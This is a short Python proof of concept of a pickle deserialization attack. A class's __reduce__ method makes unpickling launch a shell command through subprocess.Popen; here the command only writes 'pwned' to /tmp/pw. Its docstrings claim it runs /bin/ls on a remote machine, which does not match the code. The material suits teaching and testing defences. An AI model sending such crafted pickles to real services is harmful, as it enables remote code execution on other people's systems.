import pickle
import subprocess


class Payload(object):
    """Executes /bin/ls when unpickled."""

    def __reduce__(self):
        """Run /bin/ls on the remote machine."""
        return (
            subprocess.Popen,
            (
                (
                    "sh",
                    "-c",
                    "echo 'pwned' > /tmp/pw",
                ),
            ),
        )


message: bytes = pickle.dumps(Payload())

pickle.loads(message)
